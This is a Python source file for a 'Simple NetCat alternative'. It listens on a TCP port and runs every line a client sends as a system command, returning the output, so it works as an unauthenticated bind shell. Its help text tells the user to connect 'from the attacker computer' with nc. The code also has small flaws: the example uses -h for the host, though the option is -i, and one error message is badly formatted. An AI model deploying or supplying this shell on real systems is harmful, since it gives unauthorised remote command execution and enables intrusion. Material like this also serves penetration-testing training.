#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#
## @author: Danilo Basanta - https://www.linkedin.com/in/danilobasanta/ -


import argparse
import shlex
import socket
import subprocess
import sys
import textwrap
import threading


def valid_ip(address):
    try:
        host_bytes = address.split('.')
        valid = [int(b) for b in host_bytes]
        valid = [b for b in valid if b >= 0 and b <= 254]
        return len(host_bytes) == 4 and len(valid) == 4
    except IndexError:
        return False


def execute(cmd):
    cmd = cmd.strip()
    if not cmd:
        return False
    else:
        output = subprocess.check_output(shlex.split(cmd), stderr=subprocess.STDOUT)
        return output.decode()


class NetCat:
    def __init__(self, arguments):
        self.arguments = arguments
        try:
            self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        except socket.error as msg:
            sys.stderr.write(f'[-] ERROR - while create socket.\n {msg}')

    def run(self):
        if valid_ip(self.arguments.host):
            if isinstance(self.arguments.port, int):
                if 1 <= self.arguments.port <= 65535:
                    try:
                        self.server.bind((self.arguments.host, self.arguments.port))
                        self.server.listen(20)
                        print(f'[+] LISTEN - on {self.arguments.host}:{self.arguments.port}')

                        while True:
                            client_socket, address = self.server.accept()
                            print(f'[+] Accepted connection from {address[0]}:{address[1]}')
                            client_thread = threading.Thread(target=self.connection_handler, args=(client_socket,))
                            client_thread.start()

                    except socket.error as msg:
                        sys.stderr.write('[-] ERROR - Socket cannot listen.\n' % msg)

                else:
                    sys.stderr.write('[-] ERROR - Port number is not valid. Must be between 1-65535.\n')
                    sys.exit(1)
            else:
                sys.stderr.write('[-] ERROR - Port invalid.\n')
                sys.exit(1)
        else:
            sys.stderr.write('[-] ERROR - The IP address is not valid.\n')
            sys.exit(1)

    def connection_handler(self, client_connection):
        with client_connection as socket_client:
            cmd_buffer = b''

            while True:
                try:
                    socket_client.send(b'nc> ')

                    while '\n' not in cmd_buffer.decode():
                        cmd_buffer += socket_client.recv(1024)
                    response = execute(cmd_buffer.decode())
                    if response:
                        socket_client.send(response.encode())
                    cmd_buffer = b''

                except socket.error as e:
                    print(f'[--] Server killed \n{e}')
                    self.server.close()
                    sys.exit(1)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Simple NetCat alternative',
                                     formatter_class=argparse.RawDescriptionHelpFormatter,
                                     epilog=textwrap.dedent('''Example:
    ./netcat.py -h 10.10.10.100 -p 5555
    
    You can connect to the socket by using netcat or nc in the attacker computer:
        netcat|nc 10.10.10.100 5555
        nc> 
    '''))
    parser.add_argument('-i', '--host', type=str, help='Host were listen for incoming connections')
    parser.add_argument('-p', '--port', type=int, default=4444, help='Port were listen for incoming connections')

    if len(sys.argv) == 1:
        parser.print_help(sys.stderr)
        sys.exit(1)

    args = parser.parse_args()

    nc = NetCat(args)
    nc.run()
